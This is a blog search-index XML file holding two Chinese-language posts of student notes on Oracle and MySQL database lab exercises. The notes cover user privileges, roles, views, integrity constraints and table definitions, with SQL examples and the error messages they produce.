<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>数据库基本操作总结 2</title>
      <link href="/2021/12/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E6%80%BB%E7%BB%93-2/"/>
      <url>/2021/12/31/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E6%80%BB%E7%BB%93-2/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一、授权（grant）</span><br><span class="line">二、回收权限（revoke）</span><br><span class="line">三、角色（权限的集合）</span><br><span class="line">四、视图</span><br><span class="line">五、完整性</span><br></pre></td></tr></table></figure><p>操作：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">（一）授权</span><br><span class="line">1.创建用户”S学号u1”，S学号u2，S学号u3，S学号U4,并为其赋予connect角色。</span><br><span class="line">其中，学号是指你的学号，比如你的学号为20130001，则你创建的用户应该是S20130001u1，S20130001u2，S20130001u3,S20130001u4</span><br><span class="line">2.假设你的用户名是S20130001（做实验时请根据你的账号修改），把你在数据库中创建的Student表的查询权限授给用户”S学号u1”， ”S学号u1”执行相应的查询。</span><br><span class="line">（1）查询S20130001用户的Student表中全体学生的详细记录。</span><br><span class="line">（2）查询S20130001用户Student表中所有姓刘的学生的姓名、学号和性别。</span><br><span class="line">（3）查询S20130001用户Student表中名字中第二字为“阳”字的学生的姓名和学号。</span><br><span class="line">3.把S20130001用户的Student表和Course表的全部权限授予用户”S学号u2”， ”S学号u3”；然后让”S学号u2”用户修改S20130001的数据。</span><br><span class="line">4.把S20130001用户的表Student的修改学生学号的权限赋予用户” S学号U4”，然后让S20130001用户修改S20130001的student表的SNO数据。</span><br><span class="line">5.把S20130001用户的SC表的插入权限授予“S学号U5”用户，然后让“S学号U5”用户向SC表插入一条记录。</span><br><span class="line">6.把对表SC的查询权限授予所有用户。</span><br><span class="line">（1）让“S学号u2”用户查询S20130001用户的SC表中选修了3号课程的学生的学号及其成绩，查询结果按分数的降序排列</span><br><span class="line">（2）让“S学号u2”用户查询S20130001用户的SC表中各个课程号与相应的选课人数。</span><br><span class="line">（首先应该以新创建的用户的身份重新登陆数据库，然后再进行授权）</span><br><span class="line">（二）回收权限</span><br><span class="line">1.收回用户”S学号u2”修改学生学号的权限</span><br><span class="line">2.收回所有用户对表sc的查询权限</span><br><span class="line">3.收回用户”S学号U5”sc表的insert权限</span><br><span class="line">4.在回收权限之后验证用户是否真正丧失了该权限（查询表，插入记录）</span><br><span class="line">（三）角色</span><br><span class="line">1.创建一个角色</span><br><span class="line">2.给角色授予权限</span><br><span class="line">3.将角色授予某一用户</span><br><span class="line">4.检查用户是否具有相应的权限</span><br><span class="line">（四）完整性</span><br><span class="line">1．建立教师表Teacher，要求教师名称Tname列取值唯一，教师编号TNO列为主码。</span><br><span class="line">2．建立学生登记表Student，要求学号在9000至9999之间，年龄&lt;29,性别只能是’男’或’女’，姓名非空。</span><br><span class="line">3．修改表Student的结构，由年龄小于29改为小于40。</span><br><span class="line">4．建立课程表COURSE，要求课程表中的每门课程的学分不得超过7分，且主讲教师字段TNO参照Teacher表TNO字段，且当删除教师表中一行记录时，如果它被参照，则将Course表中相应记录中TNO的值设置为空。5．建立表SC，要求SNO参照STUDENT表的学号，且当删除Student表中的一个学生记录时，级联删除学生的选课记录。对上述新建立和修改定义的表，每个表输入3条数据，其中1条数据符合完整性约束，2条违反约束条件的，验证和体会Oracle的实体完整性和参照完整性。</span><br><span class="line"></span><br><span class="line">1.创建用户“S学号u1”，“S学号u2”，“S学号u3”，“S学号u4”，并为其赋予connect角色。</span><br><span class="line">其中，学号是指你的学号，比如你的学号为2019214349，则你创建的用户应该是S2019214349u1，S2019214349u2，S2019214349u3，S2019214349u4。</span><br><span class="line"></span><br><span class="line">create user S2019214349u1 identified by abc; <span class="comment"># identified by 设置密码</span></span><br><span class="line">grant connect to S2019214349u1;</span><br><span class="line">create user S2019214349u2 identified by abc;</span><br><span class="line">grant connect to S2019214349u2;</span><br><span class="line">create user S2019214349u3 identified by abc;</span><br><span class="line">grant connect to S2019214349u3;</span><br><span class="line">create user S2019214349u4 identified by abc;</span><br><span class="line">grant connect to S2019214349u4;</span><br><span class="line">create user S2019214349u5 identified by abc;</span><br><span class="line">grant connect to S2019214349u5;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line">2.假设你的用户名是D2019214349，把你在数据库中创建的Student表的查询权限授给用户”S学号u1”， ”S学号u1”执行相应的查询（S2019214349u1用户下查询D2019214349的表）。</span><br><span class="line"></span><br><span class="line">grant select on student to S2019214349u1;</span><br><span class="line"></span><br><span class="line">（1）查询D2019214349用户的Student表中全体学生的详细记录。</span><br><span class="line"></span><br><span class="line">select * from D2019214349.student;</span><br><span class="line"></span><br><span class="line">（2）查询D2019214349用户Student表中所有姓刘的学生的姓名、学号和性别。</span><br><span class="line"></span><br><span class="line">select sname,sno,ssex from D2019214349.student;</span><br><span class="line"></span><br><span class="line">（3）查询D2019214349用户Student表中名字中第二字为“阳”字的学生的姓名和学号。</span><br><span class="line"></span><br><span class="line">select sname,sno from D2019214349.student <span class="built_in">where</span> sname like <span class="string">&#x27;_阳%&#x27;</span>;</span><br><span class="line"></span><br><span class="line">3.把D2019214349用户的Student表和Course表的全部权限授予用户”S学号u2”， ”S学号u3”；然后让”S学号u2”用户修改D2019214349(简称’d用户’)的数据。</span><br><span class="line"></span><br><span class="line">在d用户上：</span><br><span class="line"></span><br><span class="line">grant all on student to S2019214349u2,S2019214349u3; <span class="comment"># all表示全部权限</span></span><br><span class="line">grant all on course to S2019214349u2,S2019214349u3;</span><br><span class="line">在u2用户上：</span><br><span class="line"></span><br><span class="line">update D2019214349.student <span class="built_in">set</span> sname=<span class="string">&#x27;王敏&#x27;</span> <span class="built_in">where</span> sno=200215129;</span><br><span class="line"></span><br><span class="line">在d用户上提交更改，这样在D2019214349上的数据才真正被更改。</span><br><span class="line"></span><br><span class="line">commit;</span><br><span class="line">select * from D2019214349.student;</span><br><span class="line"></span><br><span class="line">4.把D2019214349用户的表Student的修改学生学号的权限赋予用户” S学号U4”，然后让‘S学号U4’用户修改D2019214349的student表的SNO数据。</span><br><span class="line"></span><br><span class="line">在d用户上：</span><br><span class="line"></span><br><span class="line">grant update(sno) on student to S2019214349u4;</span><br><span class="line"></span><br><span class="line">在u4用户上：</span><br><span class="line"></span><br><span class="line">update D2019214349.student <span class="built_in">set</span> sno=200215128 <span class="built_in">where</span> sno=200215129;</span><br><span class="line">commit;</span><br><span class="line"></span><br><span class="line">5.把D2019214349用户的SC表的插入权限授予“S学号U5”用户，然后让“S学号U5”用户向SC表插入一条记录。</span><br><span class="line"></span><br><span class="line">在d用户上：</span><br><span class="line"></span><br><span class="line">grant insert on sc to S2019214349u5;</span><br><span class="line"></span><br><span class="line">在u5用户上：</span><br><span class="line"></span><br><span class="line">insert into D2019214349.sc(sno,cno,grade) values(200215128,1,99);</span><br><span class="line">commit;</span><br><span class="line"></span><br><span class="line">6.把对表SC的查询权限授予所有用户。</span><br><span class="line"></span><br><span class="line">在d用户上：</span><br><span class="line"></span><br><span class="line">grant select on sc to public; <span class="comment"># public表示所有用户</span></span><br><span class="line"></span><br><span class="line">（1）让“S学号u2”用户查询D2019214349用户的SC表中选修了3号课程的学生的学号及其成绩，查询结果按分数的降序排列。</span><br><span class="line"></span><br><span class="line">select sno,grade from D2019214349.sc <span class="built_in">where</span> cno=3 order by grade DESC;</span><br><span class="line"></span><br><span class="line">（2）让“S学号u2”用户查询D2019214349用户的SC表中各个课程号与相应的选课人数。</span><br><span class="line"></span><br><span class="line">select cno,count(*) from D2019214349.sc group by cno;</span><br><span class="line">1.收回用户”S学号u2”修改学生学号的权限。</span><br><span class="line"></span><br><span class="line">revoke update on student from S2019214349u2;</span><br><span class="line"></span><br><span class="line">注意：UPDATE/REFERENCES may only be REVOKEd from the whole table, not by column</span><br><span class="line">（不能只回收一列的update权限，只能回收一个表的）</span><br><span class="line"></span><br><span class="line">2.收回所有用户对表sc的查询权限。</span><br><span class="line"></span><br><span class="line">revoke select on D2019214349.sc from public;</span><br><span class="line"></span><br><span class="line">3.收回用户”S学号U5”sc表的insert权限。</span><br><span class="line"></span><br><span class="line">revoke insert on D2019214349.sc from S2019214349u5;</span><br><span class="line"></span><br><span class="line">4.在回收权限之后验证用户是否真正丧失了该权限（查询表，插入记录）。</span><br><span class="line">在u2用户上：update D2019214349.student <span class="built_in">set</span> sname=<span class="string">&#x27;王敏&#x27;</span> <span class="built_in">where</span> sno=200215121;</span><br><span class="line">显示：“权限不足”</span><br><span class="line">在u2用户上：select * from D2019214349.sc;</span><br><span class="line">显示：“table or view does not exist”</span><br><span class="line">在u5用户上：insert into D2019214349.sc(sno,cno,grade) values(200215121,7,99);</span><br><span class="line">显示：“table or view does not exist”</span><br><span class="line"></span><br><span class="line">说明回收权限成功。</span><br><span class="line">1.创建一个角色。</span><br><span class="line"></span><br><span class="line">create role testrole; <span class="comment"># 角色名应该不能含数字，试了一下，role1无法创建</span></span><br><span class="line"></span><br><span class="line">2.给角色授予权限。</span><br><span class="line"></span><br><span class="line">grant select on sc to testrole;</span><br><span class="line"></span><br><span class="line">3.将角色授予某一用户。</span><br><span class="line"></span><br><span class="line">grant testrole to S2019214349u5;</span><br><span class="line"></span><br><span class="line">4.检查此用户是否具有相应的权限。</span><br><span class="line"></span><br><span class="line">select * from D2019214349.sc; <span class="comment"># 在u5中查询</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">（1）建立信息系学生的视图。并查询此视图，观察结果。</span><br><span class="line"></span><br><span class="line">create view CS_STUDENT as select * from student <span class="built_in">where</span> sdept=<span class="string">&#x27;CS&#x27;</span>;</span><br><span class="line">select * from CS_STUDENT;</span><br><span class="line"></span><br><span class="line">（2）在视图上建立信息系选修了1号课程的学生的视图。</span><br><span class="line"></span><br><span class="line">create view CS_STUDENT_CNO1(sno,sname,sage,ssex,sdept) as</span><br><span class="line">select sc.sno,sname,sage,ssex,sdept from CS_STUDENT,sc </span><br><span class="line"><span class="built_in">where</span> sc.sno=CS_STUDENT.sno and sc.cno=1;</span><br><span class="line"></span><br><span class="line">（3）将学生的学号及其平均成绩定义为一个视图。</span><br><span class="line"></span><br><span class="line">create view GRADE_AVG(sno,grade_avg) as</span><br><span class="line">select sno,avg(grade) from sc group by sno;</span><br><span class="line"></span><br><span class="line">（4）将Student表中所有女生记录定义为一个视图F_stu（sno，sname，sdept，sex），并设置其更新限制with check option。</span><br><span class="line"></span><br><span class="line">create view F_stu(sno,sname,sdept,sex) as</span><br><span class="line">select sno,sname,sdept,ssex from student <span class="built_in">where</span> ssex=<span class="string">&#x27;女&#x27;</span></span><br><span class="line">with check option;</span><br><span class="line"></span><br><span class="line">（5）对4中的视图进行insert操作，将sno为200215129，sname为‘smith’，sdept为‘MA’插入视图中，结果如何？</span><br><span class="line"></span><br><span class="line">insert into F_stu(sno,sname,sdept) values(200215129,<span class="string">&#x27;smith&#x27;</span>,<span class="string">&#x27;MA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">结果显示：视图 WITH CHECK OPTIDN <span class="built_in">where</span> 子句违规。</span><br><span class="line"></span><br><span class="line">（6）对4中的视图进行insert操作，将sno为200215129，sname为‘smith’，sdept为‘MA’，sex为‘女’插入视图中，结果如何？</span><br><span class="line"></span><br><span class="line">insert into F_stu(sno,sname,sdept,sex) values(200215129,<span class="string">&#x27;smith&#x27;</span>,<span class="string">&#x27;MA&#x27;</span>,<span class="string">&#x27;女&#x27;</span>);</span><br><span class="line"></span><br><span class="line">结果显示：成功插入。</span><br><span class="line"></span><br><span class="line">完整性</span><br><span class="line">进入MySQL后先建立数据库tmps并启用：create database tmps; use tmps;</span><br><span class="line"></span><br><span class="line">1.建立教师表Teacher，要求教师名称TNAME列取值唯一，教师编号TNO列为主码。</span><br><span class="line"></span><br><span class="line">create table Teacher</span><br><span class="line">(</span><br><span class="line">    TNO int primary key,</span><br><span class="line">    TNAME varchar(20) unique</span><br><span class="line">);</span><br><span class="line">2.建立学生登记表Student，要求学号在9000至9999之间，年龄&lt;29,性别只能是’男’或’女’，姓名非空。</span><br><span class="line"></span><br><span class="line">create table Student </span><br><span class="line">(</span><br><span class="line">    SNO int primary key,</span><br><span class="line">    SAGE int,</span><br><span class="line">    SSEX char(2), </span><br><span class="line">    SNAME varchar(20) not null,</span><br><span class="line">    constraint sno_ck check(SNO&gt;=9000 and SNO&lt;=9999),</span><br><span class="line">    constraint sage_ck check(SAGE&lt;29),</span><br><span class="line">    constraint ssex_ck check(SSEX <span class="keyword">in</span> (<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;女&#x27;</span>))</span><br><span class="line">);</span><br><span class="line">3.修改表Student的结构，由年龄小于29改为小于40。</span><br><span class="line"></span><br><span class="line">alter table student drop constraint sage_ck; </span><br><span class="line">alter table student add constraint sage_ck check(sage&lt;40);</span><br><span class="line"></span><br><span class="line">修改约束不能直接修改，只能删除再添加。</span><br><span class="line">尝试用alter table student modify sage int constraint sage_ck1 check(sage&lt;40);</span><br><span class="line">实际上也是加了一个约束，写成sage_ck1是因为加的约束不能和sage_ck重复</span><br><span class="line"></span><br><span class="line">由于在MySQL中，并不检查check约束（check约束无效），所以以上语句在MySQL中运行错误，但是在Oracle数据库中能够成功运行。</span><br><span class="line"></span><br><span class="line">MySQL中check约束无效的处理方式：https://blog.csdn.net/ldx19980108/article/details/79921853</span><br><span class="line"></span><br><span class="line">4.建立课程表Course，要求课程表中的每门课程的学分不得超过7分，且主讲教师字段TNO参照Teacher表的TNO字段，且当删除教师表中一行记录时，如果它被参照，则将Course表中相应记录中TNO的值设置为空。建立表SC，要求SNO参照Student表的SNO字段，且当删除Student表中的一个学生记录时，级联删除学生的选课记录。对上述新建立和修改定义的表，每个表输入3条数据，其中2条数据符合完整性约束，1条违反约束条件，验证和体会数据库的实体完整性和参照完整性。</span><br><span class="line"></span><br><span class="line">（1）建表和插入数据。</span><br><span class="line"></span><br><span class="line">create table Course</span><br><span class="line">(</span><br><span class="line">    CNO int primary key,</span><br><span class="line">    TNO int,</span><br><span class="line">    CREDIT int check(CREDIT&lt;=7),</span><br><span class="line">    foreign key (TNO) references Teacher(TNO) on delete <span class="built_in">set</span> null</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">create table SC</span><br><span class="line">(</span><br><span class="line">    SNO int,</span><br><span class="line">    CNO int,</span><br><span class="line">    primary key (SNO,CNO),</span><br><span class="line">    foreign key (SNO) references Student(SNO) on delete cascade,</span><br><span class="line">    foreign key (CNO) references Course(CNO) on delete cascade</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">insert into Teacher(TNO,TNAME) values(101,<span class="string">&#x27;刘晨&#x27;</span>);</span><br><span class="line">insert into Teacher(TNO,TNAME) values(102,<span class="string">&#x27;张勇&#x27;</span>); </span><br><span class="line">insert into Course(CNO,TNO,CREDIT) values(001,101,3);</span><br><span class="line">insert into Course(CNO,TNO,CREDIT) values(002,101,2);</span><br><span class="line">insert into Student(SNO,SAGE,SSEX,SNAME) values(9001,20,<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;张三&#x27;</span>);</span><br><span class="line">insert into Student(SNO,SAGE,SSEX,SNAME) values(9002,21,<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;李四&#x27;</span>);</span><br><span class="line">insert into SC(SNO,CNO) values(9001,001);</span><br><span class="line">insert into SC(SNO,CNO) values(9001,002);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 违反主码约束：ERROR 1062 (23000): Duplicate entry &#x27;101&#x27; for key &#x27;PRIMARY&#x27;</span></span><br><span class="line">insert into Teacher(TNO,TNAME) values(101,<span class="string">&#x27;李苏&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 违反外键约束：ERROR 1452 (23000): Cannot add or update a child row: a foreign key constraint fails (`tmps`.`Course`, CONSTRAINT `Course_ibfk_1` FOREIGN KEY (`TNO`) REFERENCES `Teacher` (`TNO`) ON DELETE SET NULL)</span></span><br><span class="line">insert into Course(CNO,TNO,CREDIT) values(003,105,3);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 违反主码约束：ERROR 1062 (23000): Duplicate entry &#x27;9002&#x27; for key &#x27;PRIMARY&#x27;</span></span><br><span class="line">insert into Student(SNO,SAGE,SSEX,SNAME) values(9002,20, <span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;王五&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 违反外键约束：ERROR 1452 (23000): Cannot add or update a child row: a foreign key constraint fails (`tmps`.`SC`, CONSTRAINT `SC_ibfk_1` FOREIGN KEY (`SNO`) REFERENCES `Student` (`SNO`) ON DELETE CASCADE)</span></span><br><span class="line">insert into SC(SNO,CNO) values(8001,001);</span><br><span class="line"></span><br><span class="line">（2）删除Couse表中的某个TNO，则Course表中的对应TNO被置为空。</span><br><span class="line">delete from Teacher <span class="built_in">where</span> TNO=101;</span><br><span class="line">（3）删除Student表中的某个SNO，则SC表中的对应SNO被级联删除。</span><br><span class="line">delete from Student <span class="built_in">where</span> SNO=9001;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数据库基本操作总结 1</title>
      <link href="/2021/12/31/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2021/12/31/%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<p>在Oracle数据库下运行的。。。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQL语言集数据定义、数据操纵、数据查询、数据控制功能于一体。</span><br><span class="line">数据定义：create，drop，alter</span><br><span class="line">数据操纵：增(insert into … )，删(delete from …)，改(update … <span class="built_in">set</span> …)</span><br><span class="line">数据查询：select</span><br><span class="line">数据控制：grant(授予权限)，revoke(收回权限)</span><br></pre></td></tr></table></figure><p>一、数据定义（create，alter，drop）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">1.建立基本表</span><br><span class="line">创建教材中的学生表（Student）、学生选课表（SC）、课程表（Course）</span><br><span class="line">（1）学生表：Student (Sno，Sname，Sage，Ssex，Sdept），其中学号Sno为主码。</span><br><span class="line"></span><br><span class="line">create table Student</span><br><span class="line">(</span><br><span class="line">    Sno number primary key,</span><br><span class="line">    Sname varchar2(10),</span><br><span class="line">    Sage int,</span><br><span class="line">    Ssex char(2),</span><br><span class="line">    Sdept varchar2(10)</span><br><span class="line">);</span><br><span class="line">（2）课程表：Course (Cno, Cname, Cpno, Ccredit)其中课程号Cno主码；先行课为外码参照Course表中Cno字段。</span><br><span class="line"></span><br><span class="line">create table Course</span><br><span class="line">(</span><br><span class="line">    Cno number primary key,</span><br><span class="line">    Cname varchar2(10),</span><br><span class="line">    Cpno varchar2(10) references Course(Cno),</span><br><span class="line">    Ccredit int</span><br><span class="line">);</span><br><span class="line">（3）学生选课表：SC(Sno, Cno, Grade)其中学号Sno、课程号Cno为主码；Sno为外码参照Student表中Sno字段；Cno为外码参照Course表中Cno字段。</span><br><span class="line"></span><br><span class="line">create table SC</span><br><span class="line">(</span><br><span class="line">    Sno number references Student(Sno),</span><br><span class="line">    Cno number references Course(Cno),</span><br><span class="line">    Grade int,</span><br><span class="line">    primary key (Sno,Cno)</span><br><span class="line">);</span><br><span class="line">2.修改基本表</span><br><span class="line">（1）在Student表中加入属性BloodType【char(2)型】。</span><br><span class="line"></span><br><span class="line">alter table Student add BloodType char(2);</span><br><span class="line">（2）修改表Student中的Sdept属性的数据类型为varchar2(40)，注意和定义表的时候类型不同。</span><br><span class="line"></span><br><span class="line">alter table Student modify Sdept varchar2(40);</span><br><span class="line">（3）给表Student的sage列添加一个自定义约束，sage必须大于15且小于30。</span><br><span class="line"></span><br><span class="line">alter table Student add constraint age_ck check(Sage&gt;15 and Sage&lt;30);</span><br><span class="line">（4）删除（3）中新添加的约束。</span><br><span class="line"></span><br><span class="line">alter table Student drop constraint age_ck;</span><br><span class="line">（5）SC表中的sno增加外键约束f_sno，参照Student表中的sno字段。</span><br><span class="line"></span><br><span class="line">alter table sc add constraint f_sno foreign key (sno) references student(sno);</span><br><span class="line">（6）删除表Student中的字段BloodType。</span><br><span class="line"></span><br><span class="line">alter table Student drop (BloodType);   <span class="comment">#记得加括号，不加括号就要在drop前面写column</span></span><br><span class="line">3.删除基本表</span><br><span class="line">（1）删除基本表Student。</span><br><span class="line"></span><br><span class="line">drop table Student;</span><br><span class="line">（2）删除基本表SC。</span><br><span class="line"></span><br><span class="line">drop table SC;</span><br><span class="line">4.索引操作</span><br><span class="line">（1）在SC表上建立关于Sno升序、Cno降序的唯一索引i_sc+学号后四位。</span><br><span class="line"></span><br><span class="line">create unique index i_sc on SC(Sno asc,Cno desc,substr(Sno,-4));</span><br><span class="line">（2）删除Course表上的索引i_sc。</span><br><span class="line"></span><br><span class="line">drop index i_sc;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>二、数据操纵（insert，update，delete）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1.插入数据</span><br><span class="line">1）向Student表中插入数据</span><br><span class="line">2）向Course表中插入数据</span><br><span class="line">3）向SC表中插入数据</span><br><span class="line"></span><br><span class="line">insert into 